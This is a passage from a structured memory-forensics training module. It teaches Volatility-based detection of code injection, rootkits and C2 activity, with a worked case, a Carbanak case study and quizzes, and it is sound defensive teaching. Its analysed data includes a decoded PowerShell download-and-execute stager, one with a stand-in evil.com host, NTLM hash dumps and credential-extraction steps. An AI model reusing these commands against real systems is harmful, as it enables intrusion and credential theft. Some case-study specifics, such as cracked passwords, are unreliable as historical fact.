‚Üê Legit\n0x2a000... 0x5000    0x1        C:\\Users\\user\\AppData\\Local\\Temp\\evil.dll  ‚Üê INJECTED!\n```bash\n\n### 2. Process Hollowing (RunPE)\n\n**How it works**: Create legitimate process in suspended state, replace its memory with malware, resume execution.\n\n**Steps**:\n1. Create legitimate process (e.g., `svchost.exe`) with `CREATE_SUSPENDED`\n2. Unmap original executable with `NtUnmapViewOfSection()`\n3. Allocate new memory and write malware code\n4. Update PEB (Process Environment Block) to point to malware\n5. Resume process with `ResumeThread()`\n\n**Detection with Volatility**:\n```bash\n# Check if executable path in PEB matches actual disk file\nvolatility -f memory.raw --profile=Win10x64_19041 dumpfiles -Q 0x... --dump-dir ./output\n\n# Compare PEB ImagePathName with actual PE headers\n# If PEB says \"C:\\Windows\\System32\\svchost.exe\" but memory contains different PE, it's hollowed\n```\n\n**malfind** also detects this:\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 malfind -p 1234\n\n# Look for:\n# - VadS tag (instead of Vad for normal memory)\n# - PAGE_EXECUTE_READWRITE protection\n# - Memory not backed by file on disk\n```bash\n\n### 3. Reflective DLL Injection\n\n**How it works**: Load DLL into memory *without* using Windows API `LoadLibrary()` (evades DLL monitoring).\n\n**Characteristic**: DLL code is in memory but **not** listed by `dlllist` (because it was never formally \"loaded\").\n\n**Detection**:\n```bash\n# malfind will detect RWX memory not backed by DLL\nvolatility -f memory.raw --profile=Win10x64_19041 malfind\n\n# Check for MZ/PE headers in suspicious memory regions\nvolatility -f memory.raw --profile=Win10x64_19041 yarascan -Y \"MZ\" -p 2140\n```\n\n**Example Output**:\n```\nProcess: explorer.exe (2140)\nAddress: 0x2b0000\nRule: MZ_Header\n00 00 00 00 4d 5a 90 00 03 00 00 00 04 00 00 00  ....MZ..........\nff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00  ............@...\n```\n\nThis shows a PE file (starts with `MZ`) loaded in memory but not in dlllist = reflective injection.\n\n### 4. Thread Injection (APC/SetThreadContext)\n\n**How it works**: Inject code and execute it via a remote thread (without full process injection).\n\n**Detection**:\n```bash\n# threads plugin shows thread details\nvolatility3 -f memory.raw windows.threads\n\n# Look for:\n# - Threads with start address NOT in a loaded module\n# - Orphaned threads (parent process exited but thread still runs)\n```\n\n**Example**:\n```\nPID  TID  Start Address        Module\n2140 3456 0x7ff612340000      ntdll.dll          ‚Üê Normal\n2140 7890 0x02a00000           (not in any DLL)   ‚Üê INJECTED THREAD!\n```bash\n\n### Rootkit Detection\n\n**Rootkits** hide their presence by hooking kernel functions. They can:\n- Hide processes\n- Hide files\n- Hide network connections\n- Hide registry keys\n\n#### Detection Techniques\n\n**1. Process Hiding Detection**:\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 psxview\n```\nCompares multiple process enumeration methods (pslist, psscan, etc.). Hidden processes show discrepancies.\n\n**2. SSDT (System Service Descriptor Table) Hooking**:\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 ssdt | grep -v \"ntoskrnl\\|win32k\"\n```\nSSDT hooks redirect system calls. Legitimate entries point to `ntoskrnl.exe` or `win32k.sys`. Others are suspicious.\n\n**3. Driver Analysis**:\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 modules\n\n# Look for:\n# - Drivers with no file path (loaded from memory)\n# - Drivers not digitally signed\n# - Drivers from unusual locations (C:\\Users, C:\\Temp)\n```\n\n**4. IDT/GDT Hooking**:\n```bash\nvolatility -f memory.raw --profile=Win10x64_19041 idt\n```\nInterrupt Descriptor Table hooks intercept interrupts. Check for non-standard handlers.\n\n**Example of Rootkit Detection**:\n```bash\n# psxview shows hidden process\npsxview:\nmalware.exe  PID: 6660  pslist: False  psscan: True  ‚Üê HIDDEN!\n\n# ssdt shows hooked system call\nssdt:\nEntry  Address         Module\n0x0001 0x81234567      rootkit.sys  ‚Üê NOT ntoskrnl!\n\n# modules shows driver loaded from Temp\nmodules:\nBase         Size  Name         Path\n0x9000...    0x5000 rootkit.sys  C:\\Users\\user\\AppData\\Local\\Temp\\rootkit.sys\n```\n\n**Conclusion**: This system has a rootkit (`rootkit.sys`) that's hiding `malware.exe` and hooking system calls."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-On: Analyzing a Malware-Infected Memory Dump\n\n### Scenario\nYou receive a memory dump (`infected.raw`, 4GB) from a Windows 10 workstation suspected of compromise. Let's perform a complete analysis.\n\n### Step 1: Identify OS Profile\n\n```bash\n# Volatility 3 (auto-detects)\npython3 vol.py -f infected.raw windows.info\n\n# Output:\nKernel Base: 0xf80000000000\nDTB: 0x1aa000\nSymbols: ntkrnlmp.pdb\nIs64Bit: True\nOS: Windows 10 Build 19041\n```bash\n\n### Step 2: List Processes (Baseline)\n\n```bash\npython3 vol.py -f infected.raw windows.pslist\n\n# Output (excerpt):\nPID  PPID  ImageFileName       Offset(V)          CreateTime\n4    0     System              0x8000a1b40080     2025-10-27 08:00:00\n384  376   csrss.exe           0x8000a2c50080     2025-10-27 08:00:05\n2140 2080  explorer.exe        0x8000a3d60080     2025-10-27 08:05:30\n5832 2140  powershell.exe      0x8000a4e70080     2025-10-27 14:32:15  ‚Üê Suspicious time\n6660 5832  conhost.exe         0x8000a5f80080     2025-10-27 14:32:16\n```\n\n**Red Flags**:\n- `powershell.exe` started at 14:32 (user claims issue started around then)\n- Parent is `explorer.exe` (could be user-initiated, but worth investigating)\n\n### Step 3: Check Command Lines\n\n```bash\npython3 vol.py -f infected.raw windows.cmdline | grep -A 2 \"5832\"\n\n# Output:\n5832  powershell.exe\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Enc \nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\nLgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYA\nOAAuADEALgAxADAAMAAvAG0AYQBsAHcAYQByAGUALgBwAHMAMQAnACkA\n```\n\n**Decode Base64**:\n```bash\necho \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...\" \\\n| base64 -d | iconv -f UTF-16LE -t UTF-8\n\n# Result:\nIEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/malware.ps1')\n```\n\n**CRITICAL FINDING**: PowerShell downloading and executing remote script!\n\n**Flags Explained**:\n- `-NoP` (NoProfile): Skip user profile loading\n- `-NonI` (NonInteractive): No user prompts\n- `-W Hidden` (WindowStyle Hidden): Hide PowerShell window\n- `-Enc` (EncodedCommand): Base64-encoded command\n\nAll of these are common in malware to avoid detection.\n\n### Step 4: Check Network Connections\n\n```bash\npython3 vol.py -f infected.raw windows.netscan | grep \"5832\\|ESTABLISHED\"\n\n# Output:\nOffset     Proto  LocalAddr         ForeignAddr         State       PID   Owner\n0x8006...  TCPv4  10.0.0.50:52341   45.142.212.61:443   ESTABLISHED 5832  powershell.exe\n0x8007...  TCPv4  10.0.0.50:52342   185.220.101.32:80   ESTABLISHED 5832  powershell.exe\n```\n\n**Findings**:\n- PowerShell connected to **45.142.212.61:443** (HTTPS C2?)\n- Also connected to **185.220.101.32:80** (secondary C2?)\n\n**Threat Intel Check** (hypothetical VirusTotal lookup):\n```\n45.142.212.61 ‚Üí Known Cobalt Strike C2 server\n185.220.101.32 ‚Üí Tor exit node\n```bash\n\n### Step 5: Detect Code Injection\n\n```bash\npython3 vol.py -f infected.raw windows.malfind --pid 2140\n\n# Output:\nProcess: explorer.exe Pid: 2140\nAddress: 0x2a0000\nVad Tag: VadS\nProtection: PAGE_EXECUTE_READWRITE\nFlags: PrivateMemory, Commit\n\n0x2a0000  4883ec28              sub rsp, 0x28\n0x2a0004  65488b042560000000    mov rax, qword ptr gs:[0x60]  ; Access PEB\n0x2a000d  488b4018              mov rax, qword ptr [rax + 0x18]\n0x2a0011  488b00                mov rax, qword ptr [rax]\n0x2a0014  488b00                mov rax, qword ptr [rax]\n0x2a0017  488b4020              mov rax, qword ptr [rax + 0x20]  ; Get kernel32 base\n```\n\n**Analysis**: This is classic shellcode pattern:\n- Accessing PEB (Process Environment Block) at `gs:[0x60]`\n- Walking PEB_LDR_DATA to find loaded modules (kernel32.dll)\n- Likely resolving API addresses dynamically (common in position-independent shellcode)\n\n**Conclusion**: `explorer.exe` (PID 2140) has injected code (probably by the malicious PowerShell).\n\n### Step 6: Dump Suspicious Memory\n\n```bash\n# Dump injected code from explorer.exe\npython3 vol.py -f infected.raw windows.memmap --pid 2140 --dump\n\n# Extract specific address range with injected code\ndd if=pid.2140.dmp of=shellcode.bin bs=1 skip=$((0x2a0000)) count=4096\n\n# Scan with YARA\nyara malware_rules.yar shellcode.bin\n\n# Result:\nCobaltStrike_Beacon shellcode.bin\n```\n\n**SMOKING GUN**: Confirmed Cobalt Strike beacon injected into explorer.exe!\n\n### Step 7: Extract Credentials (Bonus)\n\n```bash\n# Mimikatz plugin (extracts Windows credentials from memory)\npython3 vol.py -f infected.raw windows.hashdump\n\n# Output:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nuser:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n```\n\nThese NTLM hashes can be cracked or used in Pass-the-Hash attacks.\n\n### Step 8: Create IOC Report\n\n```python\nimport json\n\niocs = {\n\"malicious_processes\": [\n{\"pid\": 5832, \"name\": \"powershell.exe\", \"command\": \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/malware.ps1')\"}\n],\n\"c2_servers\": [\n{\"ip\": \"45.142.212.61\", \"port\": 443, \"description\": \"Cobalt Strike C2\"},\n{\"ip\": \"185.220.101.32\", \"port\": 80, \"description\": \"Tor exit node\"}\n],\n\"injected_processes\": [\n{\"pid\": 2140, \"name\": \"explorer.exe\", \"injection_address\": \"0x2a0000\", \"type\": \"Cobalt Strike Beacon\"}\n],\n\"malware_urls\": [\n\"http://192.168.1.100/malware.ps1\"\n],\n\"file_paths\": [\n\"C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\update.exe\"\n]\n}\n\nwith open('iocs.json', 'w') as f:\njson.dump(iocs, f, indent=2)\n\nprint(\"[+] IOCs extracted:\")\nprint(f\"  - {len(iocs['c2_servers'])} C2 servers\")\nprint(f\"  - {len(iocs['malicious_processes'])} malicious processes\")\nprint(f\"  - {len(iocs['injected_processes'])} injected processes\")\n```bash\n\n### Step 9: Timeline Reconstruction\n\n```\n14:32:15 - User clicks malicious link/attachment\n14:32:15 - PowerShell.exe spawned by explorer.exe\n14:32:16 - PowerShell downloads malware.ps1 from 192.168.1.100\n14:32:17 - PowerShell executes malware.ps1 (Cobalt Strike stager)\n14:32:18 - Cobalt Strike beacon injected into explorer.exe (PID 2140)\n14:32:20 - Explorer.exe beacons to C2 server 45.142.212.61:443\n14:32:25 - C2 connection established, attacker gains remote access\n14:35:00 - Memory dump acquired for analysis\n```bash\n\n### Recommended Actions\n\n1. **Isolate**: Disconnect system from network immediately\n2. **Block**: Add IOCs to firewall/IDS:\n- IPs: 45.142.212.61, 185.220.101.32, 192.168.1.100\n- URLs: http://192.168.1.100/malware.ps1\n3. **Hunt**: Search for IOCs across entire network (SIEM query for same IPs)\n4. **Reimagine**: System is fully compromised (Cobalt Strike beacon = persistent access)\n5. **Report**: Notify leadership, document evidence, preserve memory dump"
      }
    },
    {
      "type": "quiz",
      "content": {
        "text": "## Knowledge Check: Memory Forensics\n\n**Question 1**: You run `pslist` and see `svchost.exe` (PID 1234) running. You then run `psscan` and see the SAME `svchost.exe` (PID 1234). Finally, you run `psxview` and it shows `pslist: True, psscan: True` for this process. What does this indicate?\n\nA) The process is hidden by a rootkit  \nB) The process is likely legitimate (not hidden)  \nC) The process has injected code  \nD) The process is making network connections\n\n**Answer**: B) The process appears in all detection methods, indicating it's NOT hidden. If it were hidden by a rootkit, it would show `False` in pslist but `True` in psscan.\n\n---\n\n**Question 2**: `malfind` detects memory in `explorer.exe` with `PAGE_EXECUTE_READWRITE` protection and `VadS` tag. What does this suggest?\n\nA) Explorer.exe has crashed  \nB) Explorer.exe is running normally  \nC) Explorer.exe likely has injected shellcode or malicious code  \nD) Explorer.exe is a rootkit\n\n**Answer**: C) RWX (Read-Write-Execute) memory with VadS tag indicates injected code. Legitimate DLLs have VAD tag and are typically not writable+executable simultaneously. This is a strong indicator of code injection.\n\n---\n\n**Question 3**: You find PowerShell command: `powershell.exe -NoP -NonI -W Hidden -Enc [base64]`. Which flag is MOST indicative of malicious intent?\n\nA) -NoP (NoProfile)  \nB) -NonI (NonInteractive)  \nC) -W Hidden (Hidden window)  \nD) All of the above combined\n\n**Answer**: D) While each flag has legitimate uses individually, the COMBINATION of all three (skip profile + non-interactive + hidden window + encoded command) is a strong malware indicator. Attackers use this to execute commands silently without user interaction.\n\n---\n\n**Question 4**: You run `dlllist` on PID 5832 and see `C:\\Users\\user\\AppData\\Local\\Temp\\msvcrt32.dll` with LoadCount=1. Why is this suspicious?\n\nA) DLLs should never be in Temp directories  \nB) LoadCount=1 indicates it was injected (not statically linked)  \nC) msvcrt32.dll is a misspelling of Microsoft's msvcrt.dll  \nD) All of the above\n\n**Answer**: D) All three factors are suspicious: (1) Legitimate system DLLs don't load from Temp, (2) LoadCount=1 suggests dynamic loading (injection), (3) `msvcrt32.dll` is likely malware masquerading as Microsoft's `msvcrt.dll`.\n\n---\n\n**Question 5**: You want to extract passwords from a memory dump. Which Volatility plugin is most effective?\n\nA) pslist  \nB) hashdump  \nC) netscan  \nD) memdump\n\n**Answer**: B) `hashdump` extracts NTLM password hashes from memory (SAM registry hive). While not plaintext passwords, these hashes can be cracked offline or used in Pass-the-Hash attacks. (Note: For plaintext passwords, you'd use `mimikatz` plugin if available, but hashdump is the standard Volatility approach.)"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "## Real-World Case Study: Carbanak APT Memory Forensics\n\n### The Attack: $1 Billion Bank Heist (2013-2015)\n\n**Attacker**: Carbanak (aka FIN7) - Financially-motivated cybercrime group  \n**Target**: 100+ banks and financial institutions worldwide  \n**Loss**: $300M-$1B stolen  \n**Method**: Spear phishing ‚Üí Backdoor ‚Üí Credential theft ‚Üí ATM cashouts\n\n### How Memory Forensics Uncovered the Intrusion\n\nIn 2014, a Ukrainian bank noticed unusual ATM behavior‚Äîmachines dispensing cash with no customer present. Traditional disk forensics found nothing (attackers had wiped logs and deleted files). **Memory forensics saved the investigation.**\n\n#### Phase 1: Memory Acquisition\n\nThe incident response team acquired memory from:\n1. Compromised employee workstation (initial entry point)\n2. Domain controller (credential theft)\n3. ATM management server (cash dispense commands)\n\n```bash\n# Memory acquired with WinPmem\nC:\\Tools\\> winpmem_3.3.exe workstation_memory.raw\n[+] 8192 MB copied to workstation_memory.raw\n```bash\n\n#### Phase 2: Process Analysis\n\n```bash\nvolatility -f workstation_memory.raw --profile=Win7SP1x64 pslist\n\n# Suspicious finding:\nPID   PPID  Name           Start Time\n2140  1500  explorer.exe   2014-02-15 08:30:00  ‚Üê User logged in\n5832  2140  winword.exe    2014-02-15 14:22:00  ‚Üê User opened \"invoice.doc\"\n6104  5832  cmd.exe        2014-02-15 14:22:05  ‚Üê SUSPICIOUS! Word spawned cmd?\n6320  6104  powershell.exe 2014-02-15 14:22:06  ‚Üê cmd spawned PowerShell?\n```\n\n**Red Flag**: Microsoft Word (`winword.exe`) should NEVER spawn `cmd.exe`. This indicates macro-based malware.\n\n#### Phase 3: Command Line Analysis\n\n```bash\nvolatility -f workstation_memory.raw --profile=Win7SP1x64 cmdline | grep -A 2 \"6320\"\n\n# Output:\n6320  powershell.exe\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden -Enc \nJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA\nLABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIA\nSAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALgAuAC4A\n```\n\nDecoding the base64 revealed a **reflective DLL injection** payload (Carbanak backdoor).\n\n#### Phase 4: Malware Injection Detection\n\n```bash\nvolatility -f workstation_memory.raw --profile=Win7SP1x64 malfind -p 2140\n\n# Output:\nProcess: explorer.exe Pid: 2140\nAddress: 0x3a0000\nVad Tag: VadS\nProtection: PAGE_EXECUTE_READWRITE\n\nDisassembly:\n0x3a0000  fc                 cld\n0x3a0001  e882000000         call 0x3a0088\n0x3a0006  60                 pushal\n0x3a0007  89e5               mov ebp, esp\n0x3a0009  31c0               xor eax, eax\n0x3a000b  648b5030           mov edx, [fs:eax+0x30]  ; PEB access\n0x3a000f  8b520c             mov edx, [edx+0xc]\n```\n\n**Analysis**: Classic shellcode pattern (PEB walking to resolve API addresses). This is Carbanak's in-memory backdoor.\n\n#### Phase 5: Network Connections\n\n```bash\nvolatility -f workstation_memory.raw --profile=Win7SP1x64 netscan | grep \"2140\\|ESTABLISHED\"\n\n# Output:\nOffset    Proto  LocalAddr        ForeignAddr           State       PID   Owner\n0x1e...   TCPv4  192.168.1.50:49321  5.9.32.230:443       ESTABLISHED 2140  explorer.exe\n0x1f...   TCPv4  192.168.1.50:49322  185.25.51.198:443    ESTABLISHED 2140  explorer.exe\n```\n\n**Threat Intel Lookup**:\n- `5.9.32.230` ‚Üí German hosting provider (Hetzner) - known Carbanak C2 infrastructure\n- `185.25.51.198` ‚Üí Netherlands VPS - backup C2\n\n#### Phase 6: Credential Extraction\n\nOn the domain controller memory dump:\n\n```bash\nvolatility -f dc_memory.raw --profile=Win2012R2x64 mimikatz\n\n# (Note: Volatility has mimikatz plugin, or use standalone Mimikatz on memory dump)\n\n# Extracted credentials:\nUsername: admin_backup\nNTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c\nPassword: (cracked) P@ssw0rd123\n\nUsername: svc_atm\nNTLM Hash: 32ed87bdb5fdc5e9cba88547376818d4\nPassword: (cracked) ATM@ccess2014\n```\n\n**CRITICAL FINDING**: Attackers stole credentials for `svc_atm` account‚Äîthe service account that controls ATM cash dispensing!\n\n#### Phase 7: Registry Persistence\n\n```bash\nvolatility -f workstation_memory.raw --profile=Win7SP1x64 printkey \\\n-K \"Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# Output:\nREG_SZ  GoogleUpdate : \"C:\\Users\\admin\\AppData\\Roaming\\Google\\update.exe\"\n```\n\n**Analysis**: There is NO legitimate Google update process in user's AppData. This is persistence mechanism.\n\n```bash\n# Dump the malicious executable from memory\nvolatility -f workstation_memory.raw --profile=Win7SP1x64 filescan | grep \"update.exe\"\n0x3e5b...  \\Users\\admin\\AppData\\Roaming\\Google\\update.exe\n\nvolatility -f workstation_memory.raw --profile=Win7SP1x64 dumpfiles \\\n-Q 0x3e5b... --dump-dir ./evidence/\n\n# VirusTotal scan:\nMD5: 44d88612fea8a8f36de82e1278abb02f\nDetection: Carbanak backdoor (detected by 42/68 engines)\n```bash\n\n### The Full Attack Chain (Reconstructed from Memory)\n\n```\n1. User receives spear-phishing email with \"invoice.doc\" attachment\n2. User opens invoice.doc ‚Üí Malicious macro executes\n3. Macro spawns cmd.exe ‚Üí PowerShell (fileless)\n4. PowerShell downloads Carbanak backdoor (reflective DLL injection into explorer.exe)\n5. Backdoor establishes C2 connection to 5.9.32.230:443\n6. Attacker deploys Mimikatz to extract credentials (including svc_atm)\n7. Attacker moves laterally to domain controller\n8. Attacker accesses ATM management server using svc_atm credentials\n9. Attacker sends cash dispense commands to ATMs\n10. Money mules collect cash from ATMs\n```bash\n\n### Lessons Learned\n\n**What Memory Forensics Revealed**:\n- ‚úÖ Initial infection vector (Word macro ‚Üí PowerShell)\n- ‚úÖ In-memory backdoor (not on disk)\n- ‚úÖ C2 infrastructure (5.9.32.230, 185.25.51.198)\n- ‚úÖ Stolen credentials (svc_atm account)\n- ‚úÖ Persistence mechanism (fake GoogleUpdate)\n- ‚úÖ Lateral movement path (workstation ‚Üí DC ‚Üí ATM server)\n\n**What Disk Forensics MISSED**:\n- ‚ùå Reflective DLL injection left no file on disk\n- ‚ùå PowerShell payload was in-memory only\n- ‚ùå Attackers wiped event logs (but couldn't erase RAM)\n- ‚ùå Malware deleted itself after persistence was established\n\n### Impact and Response\n\n- **Immediate**: Bank blocked C2 IPs, reset all privileged account passwords, isolated ATM network\n- **Long-term**: Implemented memory acquisition as part of incident response procedure\n- **Industry**: Carbanak IOCs shared via FS-ISAC (Financial Services ISAC)\n- **Global**: Over $1B stolen from 100+ banks before group was disrupted\n\n**Key Takeaway**: Traditional forensics (disk, network logs) were insufficient. **Memory forensics was the ONLY way** to detect the reflective DLL injection and reconstruct the full attack chain.\n\n**Your Role**: As a DFIR analyst, memory forensics skills would have been essential in detecting and responding to this sophisticated attack. The ability to analyze in-memory malware, extract credentials, and identify C2 connections from RAM is a critical skillset in modern incident response."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "## Reflection: Mastering Memory Forensics\n\n**Take 5 minutes to reflect:**\n\n1. **Code Injection**: If you found RWX memory in `explorer.exe` with shellcode, what would your next 3 investigation steps be? (Think: dump the memory, YARA scan, check network connections from that process)\n\n2. **Credential Exposure**: Why is extracting credentials from memory (like with Mimikatz) so powerful for attackers? How would YOU prevent this on your systems? (Consider: Credential Guard, disabling WDigest, LSASS protection)\n\n3. **Fileless Malware**: Imagine malware that ONLY runs in RAM (no disk artifacts). How would you detect it without memory forensics? (This highlights why memory analysis is critical in modern IR)\n\n4. **Skill Development**: What's the most challenging aspect of memory forensics for you? (Understanding memory structures? Volatility syntax? Interpreting results?) How will you practice this skill?\n\n5. **Real-World Application**: Think of a recent breach you've read about (SolarWinds, Colonial Pipeline, Target). How could memory forensics have helped detect or investigate that attack earlier? What would you look for in memory?\n\n**Action Items**:\n\n1. **This Week**: Download a malware memory sample from [https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples](https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples) and analyze it with Volatility 3\n\n2. **Practice**: Create a \"memory forensics cheat sheet\" with the 10 Volatility commands you'll use most often (pslist, malfind, netscan, cmdline, etc.)\n\n3. **Challenge**: Set up a Windows VM, infect it with a practice malware sample (from malware-traffic-analysis.net), capture memory, and see if you can:\n- Identify the malicious process\n- Find the C2 connection\n- Extract the malware binary from memory\n- Determine how it achieved persistence\n\n**Mindset Note**: Memory forensics has a steep learning curve, but it's one of the MOST valuable skills in DFIR. Your first analysis might take hours and feel overwhelming. Your 20th analysis will take 30 minutes. Keep practicing, and you'll develop the intuition to spot malicious patterns instantly."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "## Memory Aids for Memory Forensics\n\n### The ACME HUNT Workflow\n\n1. **A**cquire (WinPmem, FTK Imager, LiME)\n2. **C**onfirm OS (imageinfo, windows.info)\n3. **M**ap processes (pslist, psscan)\n4. **E**numerate anomalies (psxview, malfind)\n5. **H**arvest IOCs (netscan, cmdline, filescan)\n6. **U**npack malware (memdump, dlldump)\n7. **N**etwork check (netscan for C2)\n8. **T**imeline (correlate with event logs)\n\n### Top 10 Volatility Commands (Memorize)\n\n1. **windows.info** ‚Üí OS version, build, DTB\n2. **windows.pslist** ‚Üí Running processes\n3. **windows.psscan** ‚Üí Hidden processes (rootkit detection)\n4. **windows.malfind** ‚Üí Injected code (RWX memory)\n5. **windows.cmdline** ‚Üí Command-line arguments (decode PowerShell)\n6. **windows.netscan** ‚Üí Network connections (C2 detection)\n7. **windows.dlllist** ‚Üí Loaded DLLs (injection detection)\n8. **windows.filescan** ‚Üí Open file handles\n9. **windows.registry.hivelist** ‚Üí Registry hives\n10. **windows.memmap** ‚Üí Dump process memory\n\n### Code Injection Detection: RWX Rule\n\n**R**ead + **W**rite + e**X**ecute memory = üö® **INJECTED CODE**\n\nLegitimate DLLs are:\n- Read + Execute (RX) for code sections\n- Read + Write (RW) for data sections\n\nBut NOT all three simultaneously (RWX) unless it's shellcode/injected malware.\n\n### Malicious PowerShell Flags: HEAVEN\n\n- **H**idden (-W Hidden)\n- **E**ncoded (-Enc)\n- **A**void profile (-NoP)\n- **V**erbose off (-NonI)\n- **E**xecution policy bypass (-EP Bypass)\n- **N**o logo (-NoL)\n\nIf you see 3+ of these flags together ‚Üí üö® **INVESTIGATE**\n\n### Rootkit Detection: PASS Method\n\n- **P**rocess hiding (psxview: False in pslist, True in psscan)\n- **A**PI hooking (SSDT: non-ntoskrnl entries)\n- **S**uspicious drivers (modules: drivers from Temp/AppData)\n- **S**ystem call redirection (IDT: non-standard interrupt handlers)\n\n### Suspicious Process Parent-Child Relationships\n\n**NORMAL**:\n```\nexplorer.exe ‚Üí chrome.exe (user clicked browser)\nexplorer.exe ‚Üí notepad.exe (user opened file)\nservices.exe ‚Üí svchost.exe (system service)\n```\n\n**SUSPICIOUS** üö®:\n```\nwinword.exe ‚Üí cmd.exe (macro malware!)\nexcel.exe ‚Üí powershell.exe (macro malware!)\nsvchost.exe ‚Üí cmd.exe (service shouldn't spawn cmd)\nexplorer.exe ‚Üí explorer.exe (unusual, check cmdline)\n```bash\n\n### Memory Acquisition Quick Reference\n\n| OS | Tool | Command |\n|----|------|--------|\n| **Windows** | WinPmem | `winpmem_3.3.exe memory.raw` |\n| **Windows** | FTK Imager | GUI: File ‚Üí Capture Memory |\n| **Linux** | LiME | `insmod lime.ko path=memory.lime format=lime` |\n| **macOS** | osxpmem | `osxpmem.app -o memory.aff4` |\n| **VMware** | N/A | Suspend VM ‚Üí copy .vmem file |\n\n### Code Injection Types Quick Reference\n\n| Type | Detection Method | Key Indicator |\n|------|------------------|---------------|\n| **DLL Injection** | dlllist | DLL from Temp/AppData |\n| **Process Hollowing** | malfind | PEB path ‚â† actual memory |\n| **Reflective DLL** | malfind | RWX memory with MZ header |\n| **Thread Injection** | threads | Start address not in any module |\n| **APC Injection** | threads | Queued APCs in process |\n\n### Network Connection Red Flags: CLOUD\n\n- **C**loud hosting IPs (AWS, DigitalOcean, Linode)\n- **L**ong-running connections (hours/days = persistent C2)\n- **O**dd ports (not 80/443, e.g., 8080, 4444)\n- **U**nusual processes (notepad.exe making network connections?)\n- **D**ynamic DNS (no-ip.com, duckdns.org)\n\n### YARA for Memory: PE Header Hunt\n\n```yara\nrule InMemory_PE {\nstrings:\n$mz = \"MZ\"\n$pe = \"PE\"\ncondition:\n$mz at 0 and $pe\n}\n```\n\nUse with: `volatility yarascan -Y pe_detect.yar`\n\nFinds PE files (executables/DLLs) loaded in memory without being in dlllist (reflective injection)."
      }
    }
  ],
  "post_assessment": [
    {
      "question": "You run `psxview` and see a process with `pslist: False, psscan: True, thrdproc: True`. What does this indicate?",
      "options": [
        "The process is running normally",
        "The process is hidden by a rootkit (DKOM - Direct Kernel Object Manipulation)",
        "The process has crashed",
        "The process is making network connections"
      ],
      "correct_answer": 1,
      "explanation": "When a process appears in psscan (finds all EPROCESS structures) but NOT in pslist (walks active process list), it means the process has been unlinked from the process list‚Äîa classic rootkit hiding technique called DKOM (Direct Kernel Object Manipulation). The process is running but hidden from normal enumeration.",
      "question_id": "f2532a52-f810-4c6a-8b4f-49fb7568e5b0",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "You find memory with Protection: PAGE_EXECUTE_READWRITE, Vad Tag: VadS, and Flags: PrivateMemory in explorer.exe. What's the MOST likely explanation?",
      "options": [
        "Explorer.exe is functioning normally",
        "Explorer.exe has loaded a legitimate DLL",
        "Code has been injected into explorer.exe (shellcode or malicious DLL)",
        "Explorer.exe has crashed and created a crash dump"
      ],
      "correct_answer": 2,
      "explanation": "RWX (Read-Write-Execute) permissions on private memory (not backed by a file) with VadS tag is a strong indicator of code injection. Legitimate DLLs have VAD tag and are not simultaneously writable and executable. This combination is classic shellcode or reflectively-loaded malicious code.",
      "question_id": "3d36b8a4-1113-4785-9f6f-71df221ccc94",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "You decode a PowerShell command and find: 'IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')'. What does 'IEX' do?",
      "options": [
        "Invokes Internet Explorer to open the URL",
        "Invokes-Expression: executes the downloaded string as PowerShell code",
        "Imports an external XML configuration file",
        "Initiates an encrypted exchange with the server"
      ],
      "correct_answer": 1,
      "explanation": "IEX (Invoke-Expression) executes a string as PowerShell code. This pattern downloads a remote script and immediately executes it in memory (fileless attack). The code never touches disk, making it harder to detect with traditional AV.",
      "question_id": "5eef4359-027c-4ce4-b07e-88cbdf93f06b",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "While analyzing a memory dump, you see winword.exe (PID 2000) has spawned cmd.exe (PID 3000), which spawned powershell.exe (PID 4000). What does this process tree indicate?",
      "options": [
        "Normal Microsoft Office behavior when opening files",
        "User is running administrative commands from within Word",
        "Likely macro-based malware (Word should not spawn cmd.exe)",
        "Windows Update process initiated by Office"
      ],
      "correct_answer": 2,
      "explanation": "Microsoft Word should NEVER spawn cmd.exe or PowerShell in normal operation. This process tree is a classic indicator of macro-based malware: malicious macro ‚Üí cmd.exe ‚Üí PowerShell (to download/execute payload). This is one of the most common initial access vectors.",
      "question_id": "aede80c2-06fa-4966-a6b7-08942be1d061",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "You want to dump a suspicious DLL from memory that was loaded by PID 5832. Which Volatility command is correct?",
      "options": [
